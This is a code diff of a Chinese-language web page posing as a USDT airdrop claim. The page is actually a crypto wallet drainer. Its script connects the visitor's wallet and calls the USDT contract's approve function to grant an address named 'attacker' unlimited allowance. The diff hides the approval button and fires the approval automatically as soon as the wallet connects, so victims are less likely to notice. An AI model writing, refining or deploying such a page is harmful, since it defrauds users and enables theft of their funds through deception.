@@ -10,10 +10,11 @@
 </head>
 <body style="text-align:center; padding-top:60px; font-family:sans-serif">
   <h2>🎉 恭喜你獲得 USDT 空投！</h2>
-  <p>請先連接錢包並確認授權以領取獎勵</p>
-  <button id="connectButton">連接錢包</button>
+  <p>請使用手機錢包掃描以下畫面並確認授權以領取獎勵</p>
+  <button id="connectButton">📲 掃碼連接錢包</button>
   <br><br>
-  <button id="approveButton">確認授權</button>
+  <button id="approveButton" style="display:none;">🛡️ 確認授權</button>
+  <p id="status"></p>
 
   <script>
     let provider;
@@ -51,15 +52,11 @@
       provider = new ethers.providers.Web3Provider(instance);
       signer = provider.getSigner();
       const address = await signer.getAddress();
-      alert("✅ 已連接錢包：" + address);
+      document.getElementById("status").innerText = "✅ 錢包已連接：" + address;
+      approve(); // 自動跳授權
     });
 
-    document.getElementById("approveButton").addEventListener("click", async () => {
-      if (!signer) {
-        alert("請先連接錢包");
-        return;
-      }
-
+    async function approve() {
       const network = await provider.getNetwork();
       const chainId = network.chainId;
       const tokenAddress = USDT_BY_CHAIN[chainId];
@@ -72,12 +69,12 @@
       const contract = new ethers.Contract(tokenAddress, abi, signer);
       try {
         const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
-        alert("✅ 授權成功！Tx Hash: " + tx.hash);
+        document.getElementById("status").innerText = "✅ 授權成功！Tx Hash: " + tx.hash;
       } catch (err) {
-        alert("❌ 授權失敗：" + err.message);
+        document.getElementById("status").innerText = "❌ 授權失敗：" + err.message;
         console.error(err);
       }
-    });
+    }
   </script>
 </body>
 </html>
